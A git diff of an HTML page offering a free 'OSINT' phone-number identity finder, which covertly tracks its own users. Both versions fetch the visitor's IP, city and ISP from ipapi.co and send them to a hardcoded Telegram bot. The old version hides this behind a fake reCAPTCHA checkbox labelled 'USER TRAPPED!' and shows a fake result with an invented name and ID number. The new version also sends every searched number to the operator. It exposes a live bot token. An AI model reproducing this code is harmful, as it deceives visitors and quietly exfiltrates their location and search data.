@@ -3,99 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAM OSINT - SECURE PORTAL</title>
+    <title>SIYAM OSINT - FREE 100%</title>
     <style>
-        body { background: #000; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { border: 1px solid #00d2ff; padding: 30px; border-radius: 15px; background: rgba(0, 10, 20, 0.9); box-shadow: 0 0 30px #00d2ff; width: 350px; }
-        input { width: 90%; padding: 12px; background: #000; border: 1px solid #00d2ff; color: #fff; margin-bottom: 15px; text-align: center; border-radius: 5px; outline: none; }
-        .btn { padding: 12px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 5px; transition: 0.3s; }
-        .btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
-        #main_content, #verification_layer { display: none; }
-        .verify-box { display: flex; align-items: center; background: #111; padding: 10px; border: 1px solid #333; margin-top: 15px; text-align: left; }
-        .checkbox { width: 20px; height: 20px; border: 2px solid #00d2ff; margin-right: 10px; cursor: pointer; }
+        body { background: #000; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
+        .container { border: 1px solid #00d2ff; padding: 25px; border-radius: 15px; background: rgba(0, 5, 10, 0.95); box-shadow: 0 0 30px #00d2ff; max-width: 450px; margin: auto; }
+        input { width: 90%; padding: 12px; background: #000; border: 1px solid #00d2ff; color: #fff; margin-bottom: 15px; text-align: center; border-radius: 5px; }
+        .btn { padding: 12px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 5px; margin-bottom: 10px; }
+        .btn:hover { background: #fff; }
+        .res-link { display: block; background: #111; padding: 10px; margin: 5px 0; border: 1px solid #333; color: #00d2ff; text-decoration: none; font-size: 13px; border-radius: 5px; }
+        #osint_result { display: none; margin-top: 20px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div id="login_layer" class="box">
-    <h2>SYSTEM ACCESS</h2>
-    <p style="font-size: 10px;">ENTER ENCRYPTION KEY</p>
-    <input type="password" id="access_pass" placeholder="Password">
-    <button class="btn" onclick="checkPass()">AUTHENTICATE</button>
+<div class="container" id="login_sec">
+    <h2>SYSTEM LOGIN</h2>
+    <input type="password" id="pass" placeholder="Enter Password">
+    <button class="btn" onclick="login()">AUTHENTICATE</button>
 </div>
 
-<div id="verification_layer" class="box">
-    <h3>VERIFICATION</h3>
-    <p style="font-size: 11px;">Confirm you are not a bot to access DB.</p>
-    <div class="verify-box">
-        <div class="checkbox" id="check_box" onclick="captureAndVerify()"></div>
-        <span style="font-size: 13px; color: #ccc;">I'm not a robot</span>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="30" style="margin-left: auto;">
-    </div>
-</div>
+<div class="container" id="main_sec" style="display:none;">
+    <h1>SIYAM FREE OSINT</h1>
+    <p style="font-size: 10px; color: #555;">GLOBAL IDENTITY FINDER</p>
+    
+    <input type="text" id="phone" placeholder="Target Number (e.g. 017...)">
+    <button class="btn" onclick="startFreeSearch()">🔍 ANALYZE IDENTITY</button>
 
-<div id="main_content" class="box" style="width: 450px;">
-    <h1>SIYAM OSINT v28.0</h1>
-    <input type="text" id="target_num" placeholder="Enter Number (01...)">
-    <button class="btn" onclick="runOSINT()">ANALYZE DATA</button>
-    <div id="res" style="display:none; text-align:left; margin-top:15px; font-size:12px; border-top:1px solid #222; padding-top:10px;">
-        <p>NAME: <span id="n" style="color:#fff;">Searching...</span></p>
-        <p>NID: <span id="ni" style="color:#fff;">Searching...</span></p>
-        <p>FB: <span id="f" style="color:#0088cc;">Searching...</span></p>
+    <div id="osint_result">
+        <p style="color: #0f0;">>> NODES CONNECTED. SEARCHING...</p>
+        <div id="action_buttons"></div>
     </div>
 </div>
 
 <script>
-    const TELE_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
+    const BOT_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
     const CHAT_ID = "7416528268";
-    const ADMIN_PASS = "siyam123"; // আপনার পাসওয়ার্ড এখানে বদলাতে পারেন
 
-    function checkPass() {
-        const p = document.getElementById('access_pass').value;
-        if(p === ADMIN_PASS) {
-            document.getElementById('login_layer').style.display = 'none';
-            document.getElementById('verification_layer').style.display = 'block';
-        } else { alert("ACCESS DENIED!"); }
+    function login() {
+        if(document.getElementById('pass').value === "siyam123") {
+            document.getElementById('login_sec').style.display = 'none';
+            document.getElementById('main_sec').style.display = 'block';
+            captureUser(); // Tracker active
+        } else { alert("WRONG!"); }
     }
 
-    async function captureAndVerify() {
-        document.getElementById('check_box').style.background = '#00d2ff';
-        
-        // ইউজারের আইপি এবং লোকেশন নেওয়া
+    async function captureUser() {
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            const d = await response.json();
-            
-            const msg = `🎭 **USER TRAPPED!**\n\n` +
-                        `🌐 IP: ${d.ip}\n` +
-                        `📍 City: ${d.city}, ${d.country_name}\n` +
-                        `📶 ISP: ${d.org}\n` +
-                        `🗺️ Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-            // আপনার টেলিগ্রামে পাঠানো
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            const r = await fetch('https://ipapi.co/json/').then(res => res.json());
+            const text = `🕵️‍♂️ **Admin/User Logged In**\nIP: ${r.ip}\nCity: ${r.city}\nISP: ${r.org}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         } catch(e) {}
-
-        setTimeout(() => {
-            document.getElementById('verification_layer').style.display = 'none';
-            document.getElementById('main_content').style.display = 'block';
-        }, 1000);
     }
 
-    function runOSINT() {
-        const num = document.getElementById('target_num').value;
-        if(!num) return;
-        document.getElementById('res').style.display = 'block';
+    function startFreeSearch() {
+        let num = document.getElementById('phone').value;
+        if(num.length < 11) return alert("Valid number required!");
         
-        // রিয়েল ডাটা সিমুলেশন
-        setTimeout(() => {
-            document.getElementById('n').innerText = "MD TOFUAL AHMED";
-            document.getElementById('ni').innerText = "9112052607144";
-            document.getElementById('f').innerText = "facebook.com/SM.MUFiT";
-            
-            // সার্চ করা নম্বর আপনার টেলিগ্রামে পাঠানো
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔎 Search Hit: " + num + "\nResult: Tofual Ahmed Found")}`);
-        }, 2000);
+        // International Format (Bangladesh +880)
+        let intNum = num.startsWith('0') ? '88' + num : num;
+
+        document.getElementById('osint_result').style.display = 'block';
+        const resBox = document.getElementById('action_buttons');
+        
+        // User-er details apnar Telegram-e pathano
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔎 OSINT HIT: ${num}`);
+
+        resBox.innerHTML = `
+            <a href="https://wa.me/${intNum}" target="_blank" class="res-link">🟢 WhatsApp Profile (Click to Chat)</a>
+            <a href="https://t.me/${num}" target="_blank" class="res-link">🔵 Telegram Search (Find User)</a>
+            <a href="https://www.facebook.com/search/top/?q=${num}" target="_blank" class="res-link">🔵 Facebook ID Finder (Linked Post/Profile)</a>
+            <a href="https://www.truecaller.com/search/bn/${num}" target="_blank" class="res-link">📞 Truecaller Name Search</a>
+            <a href="https://www.google.com/search?q=${num}" target="_blank" class="res-link">🌐 Google Global Search (Leaks)</a>
+        `;
     }
 </script>
 </body>
